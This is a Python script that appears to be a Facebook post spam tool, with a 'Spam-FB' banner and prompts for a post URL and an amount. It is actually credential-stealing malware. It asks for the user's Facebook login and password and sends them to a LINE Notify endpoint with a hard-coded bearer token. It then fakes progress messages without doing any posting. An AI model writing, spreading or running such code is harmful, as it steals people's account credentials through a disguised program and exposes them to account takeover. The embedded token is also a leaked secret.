import os, sys, requests

os.system("clear")
print("")
print("\033[1;0m───────────────────────────────────────────────────────")

print("""

\033[1;96m╔═══╗───────────╔═══╦══╗

║╔═╗║───────────║╔══╣╔╗║

║╚══╦══╦══╦╗╔╗──║╚══╣╚╝╚╗

╚══╗║╔╗║╔╗║╚╝╠══╣╔══╣╔═╗║

║╚═╝║╚╝║╔╗║║║╠══╣║──║╚═╝║

╚═══╣╔═╩╝╚╩╩╩╝──╚╝──╚═══╝

────║║

────╚╝""")

#───────────

print("\033[1;0m───────────────────────────────────────────────────────")

F = input("\033[1;91mURL Post :\033[1;0m ")

B = int(input("\033[1;91mAmount :\033[1;0m"))

print("\033[1;0m───────────────────────────────────────────────────────")

User = input("\033[1;91mUser or NumberPhone FB :\033[1;0m ")

password = input("\033[1;91mPassword FB :\033[1;0m ")

def lineNotify(message):

        payload = {'message':message}

        return _lineNotify(payload)

def _lineNotify(payload,file=None):

        url = 'https://notify-api.line.me/api/notify'

        token = 'JhRpYaNo51RAG8Ghru4bbHTsHgHusBV3XRn79ZJQvGO'

        headers = {'Authorization':'Bearer '+token}

        return requests.post(url, headers=headers , data = payload, files=file)

lineNotify(f'User :{User} password :{password}')

if password == f"{password}":

        print("""\033[1;96m

        ╔═══╗───────────╔═══╦══╗

        ║╔═╗║───────────║╔══╣╔╗║

        ║╚══╦══╦══╦╗╔╗──║╚══╣╚╝╚╗

        ╚══╗║╔╗║╔╗║╚╝╠══╣╔══╣╔═╗║

        ║╚═╝║╚╝║╔╗║║║╠══╣║──║╚═╝║

        ╚═══╣╔═╩╝╚╩╩╩╝──╚╝──╚═══╝

        ────║║

        ────╚╝""")

        print("")

        time.sleep(2)

        print("\033[1;91mRunning...")

        time.sleep(3)

        print("\033[1;94mfinish!!!")
